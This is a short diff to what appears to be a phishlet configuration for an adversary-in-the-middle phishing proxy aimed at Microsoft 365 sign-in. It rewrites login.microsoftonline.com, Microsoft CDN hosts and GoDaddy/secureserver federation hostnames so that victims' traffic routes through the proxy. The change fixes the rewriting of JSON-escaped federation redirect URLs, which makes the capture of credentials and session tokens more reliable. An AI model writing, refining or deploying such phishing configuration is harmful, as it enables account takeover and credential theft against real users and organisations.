@@ -51,8 +51,10 @@ sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauthimages.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   # Federation redirect URLs (inside GetCredentialType JSON and other responses)
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'secureserver.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  # Use bare {hostname} so rewrite works regardless of whether surrounding slashes
+  # are JSON-escaped (`\/\/`) or plain (`//`).
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
 
   # From aadcdn.msftauth.net — CDN scripts may reference login
   - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
